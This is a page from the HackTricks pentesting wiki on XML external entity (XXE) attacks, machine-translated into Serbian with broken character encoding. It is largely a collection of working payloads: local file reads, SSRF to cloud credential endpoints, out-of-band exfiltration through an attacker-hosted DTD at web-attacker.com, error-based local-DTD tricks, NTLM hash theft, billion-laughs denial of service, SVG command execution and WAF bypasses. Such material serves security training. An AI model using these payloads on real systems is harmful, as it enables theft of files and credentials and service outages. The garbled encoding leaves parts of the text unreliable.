# XXE - XEE - XML Eksterna Entitet

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Osnovi XML-a

XML je jezik za oznaÄavanje dizajniran za skladiÅ¡tenje i transport podataka, sa fleksibilnom strukturom koja omoguÄ‡ava koriÅ¡Ä‡enje opisno nazvanih oznaka. Razlikuje se od HTML-a po tome Å¡to nije ograniÄen na skup unapred definisanih oznaka. ZnaÄaj XML-a je opao sa porastom JSON-a, uprkos njegovoj poÄetnoj ulozi u AJAX tehnologiji.

* **Predstavljanje podataka kroz entitete**: Entiteti u XML-u omoguÄ‡avaju predstavljanje podataka, ukljuÄujuÄ‡i specijalne karaktere kao Å¡to su `&lt;` i `&gt;`, koji odgovaraju `<` i `>` kako bi se izbegla sukob sa XML-ovim sistemom oznaka.
* **Definisanje XML elemenata**: XML omoguÄ‡ava definisanje tipova elemenata, naglaÅ¡avajuÄ‡i kako bi elementi trebali biti strukturirani i koji sadrÅ¾aj mogu sadrÅ¾ati, od bilo koje vrste sadrÅ¾aja do specifiÄnih podelemenata.
* **Definicija tipa dokumenta (DTD)**: DTD-ovi su kljuÄni u XML-u za definisanje strukture dokumenta i tipova podataka koje moÅ¾e sadrÅ¾ati. Mogu biti unutraÅ¡nji, spoljaÅ¡nji ili kombinacija, usmeravajuÄ‡i kako se dokumenti formatiraju i validiraju.
* **PrilagoÄ‘eni i spoljaÅ¡nji entiteti**: XML podrÅ¾ava kreiranje prilagoÄ‘enih entiteta unutar DTD-a za fleksibilnu reprezentaciju podataka. SpoljaÅ¡nji entiteti, definisani URL-om, izazivaju bezbednosne brige, posebno u kontekstu napada XML Eksterna Entitet (XXE), koji koriste naÄin na koji XML parseri obraÄ‘uju spoljne izvore podataka: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
* **XXE detekcija sa parametarskim entitetima**: Za detekciju XXE ranjivosti, posebno kada konvencionalne metode ne uspevaju zbog bezbednosnih mera parsera, mogu se koristiti XML parametarski entiteti. Ovi entiteti omoguÄ‡avaju tehnike detekcije van opsega, kao Å¡to su pokretanje DNS upita ili HTTP zahteva ka kontrolisanoj domeni, kako bi se potvrdila ranjivost.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Glavni napadi

[**VeÄ‡ina ovih napada je testirana koristeÄ‡i sjajne Portswigger XEE laboratorije: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Test nove entitete

U ovom napadu Ä‡u testirati da li jednostavna nova deklaracija ENTITETA funkcioniÅ¡e.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (870).png>)

### ÄŒitanje fajla

PokuÅ¡ajmo da proÄitajmo `/etc/passwd` na razliÄite naÄine. Za Windows moÅ¾ete pokuÅ¡ati da proÄitate: `C:\windows\system32\drivers\etc\hosts`

U ovom prvom sluÄaju primetite da Ä‡e SYSTEM "_\*\*file:///\*\*etc/passwd_" takoÄ‘e raditi.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (86).png>)

Ovaj drugi sluÄaj bi trebao biti koristan za ekstrakciju fajla ako web server koristi PHP (Nije sluÄaj sa Portswigger laboratorijama)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
U ovom treÄ‡em sluÄaju primetite da deklariramo `Element stockCheck` kao ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (753).png>)

### Directory listing

U **Java** aplikacijama moÅ¾e biti moguÄ‡e **prikazati sadrÅ¾aj direktorijuma** putem XXE sa payload-om kao (samo traÅ¾eÄ‡i direktorijum umesto datoteke):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXE se moÅ¾e koristiti za zloupotrebu SSRF unutar oblaka
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

KoristeÄ‡i **prethodno komentarisanu tehniku** moÅ¾ete naterati server da pristupi serveru koji kontroliÅ¡ete kako biste pokazali da je ranjiv. Ali, ako to ne funkcioniÅ¡e, moÅ¾da je to zato Å¡to **XML entiteti nisu dozvoljeni**, u tom sluÄaju moÅ¾ete pokuÅ¡ati koristiti **XML parametarske entitete**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - Ekstrakcija podataka van kanala

**U ovom sluÄaju Ä‡emo naterati server da uÄita novu DTD sa zloÄ‡udnim payload-om koji Ä‡e poslati sadrÅ¾aj datoteke putem HTTP zahteva (za viÅ¡elinijske datoteke moÅ¾ete pokuÅ¡ati da ih ekstraktujete putem \_ftp://**\_ koristeÄ‡i ovaj osnovni server na primer [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Ovo objaÅ¡njenje se zasniva na** [**Portswigger laboratoriji ovde**](https://portswigger.net/web-security/xxe/blind)**.**

U datoj zloÄ‡udnoj DTD, sprovodi se niz koraka za ekstrakciju podataka:

### Primer zloÄ‡udne DTD:

Struktura je sledeÄ‡a:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
The steps executed by this DTD include:

1. **Definicija Parametarskih Entiteta:**
* XML parametarski entitet, `%file`, se kreira, ÄitajuÄ‡i sadrÅ¾aj datoteke `/etc/hostname`.
* Drugi XML parametarski entitet, `%eval`, se definiÅ¡e. DinamiÄki deklarira novi XML parametarski entitet, `%exfiltrate`. Entitet `%exfiltrate` je postavljen da izvrÅ¡i HTTP zahtev ka serveru napadaÄa, prosleÄ‘ujuÄ‡i sadrÅ¾aj entiteta `%file` unutar upitnog stringa URL-a.
2. **IzvrÅ¡enje Entiteta:**
* Entitet `%eval` se koristi, Å¡to dovodi do izvrÅ¡enja dinamiÄke deklaracije entiteta `%exfiltrate`.
* Entitet `%exfiltrate` se zatim koristi, pokreÄ‡uÄ‡i HTTP zahtev ka specificiranom URL-u sa sadrÅ¾ajem datoteke.

NapadaÄ hostuje ovaj zlonamerni DTD na serveru pod svojom kontrolom, obiÄno na URL-u kao Å¡to je `http://web-attacker.com/malicious.dtd`.

**XXE Payload:** Da bi iskoristio ranjivu aplikaciju, napadaÄ Å¡alje XXE payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ovaj payload definiÅ¡e XML parametarsku entitet `%xxe` i ukljuÄuje je unutar DTD-a. Kada je obraÄ‘en od strane XML parsera, ovaj payload preuzima eksterni DTD sa napadaÄevog servera. Parser zatim interpretira DTD inline, izvrÅ¡avajuÄ‡i korake navedene u zloÄ‡udnom DTD-u i dovodeÄ‡i do eksfiltracije datoteke `/etc/hostname` na napadaÄev server.

### GreÅ¡ka zasnovana (Eksterni DTD)

**U ovom sluÄaju Ä‡emo naterati server da uÄita zloÄ‡udni DTD koji Ä‡e prikazati sadrÅ¾aj datoteke unutar poruke o greÅ¡ci (ovo je vaÅ¾no samo ako moÅ¾ete videti poruke o greÅ¡ci).** [**Primer odavde.**](https://portswigger.net/web-security/xxe/blind)

Poruka o greÅ¡ci prilikom parsiranja XML-a, koja otkriva sadrÅ¾aj datoteke `/etc/passwd`, moÅ¾e biti izazvana koriÅ¡Ä‡enjem zloÄ‡udnog eksternog Definicije tipa dokumenta (DTD). To se postiÅ¾e kroz sledeÄ‡e korake:

1. Definisan je XML parametarski entitet pod imenom `file`, koji sadrÅ¾i sadrÅ¾aj datoteke `/etc/passwd`.
2. Definisan je XML parametarski entitet pod imenom `eval`, koji ukljuÄuje dinamiÄku deklaraciju za drugi XML parametarski entitet pod imenom `error`. Ovaj `error` entitet, kada se evaluira, pokuÅ¡ava da uÄita nepostojeÄ‡u datoteku, ukljuÄujuÄ‡i sadrÅ¾aj `file` entiteta kao svoje ime.
3. `eval` entitet se poziva, Å¡to dovodi do dinamiÄke deklaracije `error` entiteta.
4. Poziv `error` entiteta rezultira pokuÅ¡ajem uÄitavanja nepostojeÄ‡e datoteke, proizvodeÄ‡i poruku o greÅ¡ci koja ukljuÄuje sadrÅ¾aj datoteke `/etc/passwd` kao deo imena datoteke.

ZloÄ‡udni eksterni DTD moÅ¾e biti pozvan sa sledeÄ‡im XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Upon execution, the web server's response should include an error message displaying the contents of the `/etc/passwd` file.

![](<../.gitbook/assets/image (809).png>)

_**Molimo vas da primetite da eksterni DTD omoguÄ‡ava ukljuÄivanje jedne entiteta unutar druge (****`eval`****), ali je to zabranjeno u internom DTD. Stoga, ne moÅ¾ete izazvati greÅ¡ku bez koriÅ¡Ä‡enja eksternog DTD (obiÄno).**_

### **GreÅ¡ka zasnovana (sistem DTD)**

Å ta je sa slepim XXE ranjivostima kada su **izvan-bend interakcije blokirane** (eksterne konekcije nisu dostupne)?

Rupa u specifikaciji XML jezika moÅ¾e **izloÅ¾iti osetljive podatke kroz poruke o greÅ¡ci kada se DTD dokumenta meÅ¡a unutraÅ¡nje i eksterne deklaracije**. Ovaj problem omoguÄ‡ava unutraÅ¡nju redefiniciju entiteta koji su deklarisani eksterno, olakÅ¡avajuÄ‡i izvrÅ¡enje napada zasnovanih na greÅ¡kama XXE. Takvi napadi koriste redefiniciju XML parametarskog entiteta, prvobitno deklarisanog u eksternom DTD, iz unutraÅ¡njeg DTD. Kada su izvan-bend konekcije blokirane od strane servera, napadaÄi moraju da se oslanjaju na lokalne DTD datoteke kako bi sproveli napad, sa ciljem da izazovu greÅ¡ku u parsiranju kako bi otkrili osetljive informacije.

Razmotrite scenario u kojem datoteÄni sistem servera sadrÅ¾i DTD datoteku na `/usr/local/app/schema.dtd`, koja definiÅ¡e entitet nazvan `custom_entity`. NapadaÄ moÅ¾e izazvati greÅ¡ku u XML parsiranju otkrivajuÄ‡i sadrÅ¾aj datoteke `/etc/passwd` podnoÅ¡enjem hibridnog DTD-a na sledeÄ‡i naÄin:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
The outlined steps are executed by this DTD:

* Definicija XML parametarskog entiteta nazvanog `local_dtd` ukljuÄuje spoljaÅ¡nju DTD datoteku smeÅ¡tenu na datoteÄnom sistemu servera.
* Dolazi do redefinicije za `custom_entity` XML parametarski entitet, prvobitno definisan u spoljaÅ¡njem DTD-u, kako bi se obuhvatio [XXE exploit zasnovan na greÅ¡ci](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Ova redefinicija je dizajnirana da izazove greÅ¡ku prilikom parsiranja, otkrivajuÄ‡i sadrÅ¾aj datoteke `/etc/passwd`.
* KoriÅ¡Ä‡enjem `local_dtd` entiteta, aktivira se spoljaÅ¡nji DTD, obuhvatajuÄ‡i novodefinisani `custom_entity`. Ova sekvenca akcija dovodi do emitovanja poruke o greÅ¡ci koja je cilj exploita.

**Real world example:** Sistemi koji koriste GNOME radno okruÅ¾enje Äesto imaju DTD na `/usr/share/yelp/dtd/docbookx.dtd` koji sadrÅ¾i entitet nazvan `ISOamso`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (625).png>)

PoÅ¡to ova tehnika koristi **interni DTD, prvo morate pronaÄ‡i vaÅ¾eÄ‡i**. To moÅ¾ete uÄiniti **instaliranjem** istog **OS / Softvera** koji server koristi i **pretraÅ¾ivanjem nekih podrazumevanih DTD-ova**, ili **uzimanjem liste** **podrazumevanih DTD-ova** unutar sistema i **proverom** da li neki od njih postoji:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Za viÅ¡e informacija proverite [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### PronalaÅ¾enje DTD-ova unutar sistema

U sledeÄ‡em sjajnom github repozitorijumu moÅ¾ete pronaÄ‡i **puteve DTD-ova koji mogu biti prisutni u sistemu**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Pored toga, ako imate **Docker sliku Å¾rtvovog sistema**, moÅ¾ete koristiti alat iz istog repozitorijuma da **skenirate** **sliku** i **pronaÄ‘ete** putanju **DTD-ova** prisutnih unutar sistema. ProÄitajte [Readme na github-u](https://github.com/GoSecure/dtd-finder) da biste saznali kako.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE putem Office Open XML Parsers

Za detaljnije objaÅ¡njenje ovog napada, **pogledajte drugi deo** [**ovog neverovatnog posta**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **od Detectify**.

MoguÄ‡nost da se **otpremaju Microsoft Office dokumenti nudi mnoge web aplikacije**, koje zatim nastavljaju da izvode odreÄ‘ene detalje iz ovih dokumenata. Na primer, web aplikacija moÅ¾e omoguÄ‡iti korisnicima da uvezu podatke otpremanjem XLSX formata tabele. Da bi parser izvukao podatke iz tabele, neizbeÅ¾no Ä‡e morati da analizira barem jedan XML fajl.

Da bi se testirala ova ranjivost, potrebno je kreirati **Microsoft Office fajl koji sadrÅ¾i XXE payload**. Prvi korak je da se kreira prazan direktorijum u koji se dokument moÅ¾e raspakovati.

Kada je dokument raspakovan, XML fajl smeÅ¡ten u `./unzipped/word/document.xml` treba otvoriti i urediti u omiljenom tekst editoru (kao Å¡to je vim). XML treba modifikovati da ukljuÄuje Å¾eljeni XXE payload, Äesto poÄinjuÄ‡i sa HTTP zahtevom.

Izmenjene XML linije treba umetnuti izmeÄ‘u dva korenska XML objekta. VaÅ¾no je zameniti URL sa URL-om koji se moÅ¾e pratiti za zahteve.

Na kraju, fajl se moÅ¾e ponovo zipovati da bi se kreirao zlonamerni poc.docx fajl. Iz prethodno kreiranog "unzipped" direktorijuma, treba pokrenuti sledeÄ‡u komandu:

Sada se kreirani fajl moÅ¾e otpremiti na potencijalno ranjivu web aplikaciju, i moÅ¾e se nadati da Ä‡e zahtev pojaviti u Burp Collaborator logovima.

### Jar: protokol

**jar** protokol je dostupan iskljuÄivo unutar **Java aplikacija**. Dizajniran je da omoguÄ‡i pristup fajlovima unutar **PKZIP** arhive (npr., `.zip`, `.jar`, itd.), obezbeÄ‘ujuÄ‡i pristup lokalnim i udaljenim fajlovima.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Da biste mogli da pristupite datotekama unutar PKZIP datoteka, to je **super korisno za zloupotrebu XXE putem sistemskih DTD datoteka.** Proverite [ovu sekciju da biste saznali kako da zloupotrebite sistemske DTD datoteke](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Proces pristupanja datoteci unutar PKZIP arhive putem jar protokola ukljuÄuje nekoliko koraka:

1. HTTP zahtev se Å¡alje za preuzimanje zip arhive sa odreÄ‘ene lokacije, kao Å¡to je `https://download.website.com/archive.zip`.
2. HTTP odgovor koji sadrÅ¾i arhivu se privremeno Äuva na sistemu, obiÄno na lokaciji kao Å¡to je `/tmp/...`.
3. Arhiva se zatim ekstrahuje da bi se pristupilo njenom sadrÅ¾aju.
4. Konkretna datoteka unutar arhive, `file.zip`, se Äita.
5. Nakon operacije, sve privremene datoteke kreirane tokom ovog procesa se briÅ¡u.

Zanimljiva tehnika za prekidanje ovog procesa u drugom koraku ukljuÄuje odrÅ¾avanje server konekcije otvorenom neodreÄ‘eno dok se sluÅ¾i arhivska datoteka. Alati dostupni na [ovoj repozitoriji](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) mogu se koristiti u tu svrhu, ukljuÄujuÄ‡i Python server (`slow_http_server.py`) i Java server (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
Pisanje fajlova u privremenom direktorijumu moÅ¾e pomoÄ‡i da se **eskalira druga ranjivost koja ukljuÄuje prelazak putanje** (kao Å¡to su lokalno ukljuÄivanje fajlova, injekcija Å¡ablona, XSLT RCE, deserializacija, itd).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Napad milijardu smeha
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml Napad
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Napad kvadratnog rasta

![](<../.gitbook/assets/image (527).png>)

#### Dobijanje NTML

Na Windows hostovima moguÄ‡e je dobiti NTML hash korisnika web servera postavljanjem responder.py handler-a:
```bash
Responder.py -I eth0 -v
```
Ğ¸ ÑĞ»Ğ°ÑšĞµĞ¼ ÑĞ»ĞµĞ´ĞµÑ›ĞµĞ³ Ğ·Ğ°Ñ…Ñ‚ĞµĞ²Ğ°
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
Then you can try to crack the hash using hashcat

## Hidden XXE Surfaces

### XInclude

Kada integriÅ¡ete podatke klijenta u XML dokumente na serverskoj strani, poput onih u backend SOAP zahtevima, direktna kontrola nad XML strukturom je Äesto ograniÄena, Å¡to oteÅ¾ava tradicionalne XXE napade zbog ograniÄenja u modifikaciji `DOCTYPE` elementa. MeÄ‘utim, `XInclude` napad pruÅ¾a reÅ¡enje omoguÄ‡avajuÄ‡i umetanje eksternih entiteta unutar bilo kog podatkovnog elementa XML dokumenta. Ova metoda je efikasna Äak i kada se moÅ¾e kontrolisati samo deo podataka unutar XML dokumenta generisanog na serveru.

Da biste izvrÅ¡ili `XInclude` napad, potrebno je deklarisati `XInclude` prostor imena i navesti putanju do datoteke za Å¾eljeni eksterni entitet. Ispod je saÅ¾et primer kako se takav napad moÅ¾e formulisati:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Check [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) for more info!

### SVG - Upload fajlova

Fajlovi koje korisnici otpremaju u odreÄ‘ene aplikacije, koji se zatim obraÄ‘uju na serveru, mogu iskoristiti ranjivosti u naÄinu na koji se obraÄ‘uju XML ili formati fajlova koji sadrÅ¾e XML. UobiÄajeni formati fajlova kao Å¡to su kancelarijski dokumenti (DOCX) i slike (SVG) zasnovani su na XML-u.

Kada korisnici **otpremaju slike**, te slike se obraÄ‘uju ili validiraju na strani servera. ÄŒak i za aplikacije koje oÄekuju formate kao Å¡to su PNG ili JPEG, **biblioteka za obradu slika na serveru moÅ¾e takoÄ‘e podrÅ¾avati SVG slike**. SVG, kao format zasnovan na XML-u, moÅ¾e biti iskoriÅ¡Ä‡en od strane napadaÄa da poÅ¡alje zlonamerne SVG slike, Äime se server izlaÅ¾e XXE (XML External Entity) ranjivostima.

Primer takvog eksploata je prikazan u nastavku, gde zlonamerna SVG slika pokuÅ¡ava da proÄita sistemske fajlove:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Druga metoda ukljuÄuje pokuÅ¡aj **izvrÅ¡avanja komandi** putem PHP "expect" omota:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
U oba sluÄaja, SVG format se koristi za pokretanje napada koji iskoriÅ¡Ä‡avaju XML procesne moguÄ‡nosti softvera servera, istiÄuÄ‡i potrebu za robusnom validacijom ulaza i bezbednosnim merama.

Proverite [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) za viÅ¡e informacija!

**Napomena: prva linija proÄitanog fajla ili rezultat izvrÅ¡enja Ä‡e se pojaviti UNUTAR kreirane slike. Tako da treba da imate pristup slici koju je SVG kreirao.**

### **PDF - UÄitavanje fajla**

ProÄitajte sledeÄ‡i post da **nauÄite kako da iskoristite XXE uÄitavanjem PDF** fajla:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: Od x-www-urlencoded do XML

Ako POST zahtev prihvata podatke u XML formatu, mogli biste pokuÅ¡ati da iskoristite XXE u tom zahtevu. Na primer, ako normalan zahtev sadrÅ¾i sledeÄ‡e:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Ğ¢Ğ°Ğ´Ğ° Ğ±Ğ¸ÑÑ‚Ğµ Ğ¼Ğ¾Ğ³Ğ»Ğ¸ Ğ´Ğ° Ğ¿Ğ¾ÑˆĞ°Ñ™ĞµÑ‚Ğµ ÑĞ»ĞµĞ´ĞµÑ›Ğ¸ Ğ·Ğ°Ñ…Ñ‚ĞµĞ², ÑĞ° Ğ¸ÑÑ‚Ğ¸Ğ¼ Ñ€ĞµĞ·ÑƒĞ»Ñ‚Ğ°Ñ‚Ğ¾Ğ¼:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Od JSON-a do XEE

Da biste promenili zahtev, moÅ¾ete koristiti Burp ekstenziju pod nazivom â€œ**Content Type Converter**â€œ. [Ovde](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) moÅ¾ete pronaÄ‡i ovaj primer:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
JoÅ¡ jedan primer se moÅ¾e naÄ‡i [ovde](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & ObilaÅ¾enje zaÅ¡tita

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Ovo funkcioniÅ¡e samo ako XML server prihvata `data://` protokol.

### UTF-7

MoÅ¾ete koristiti \[**"Encode Recipe**" od cyberchef-a ovde ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) za transformaciju u UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
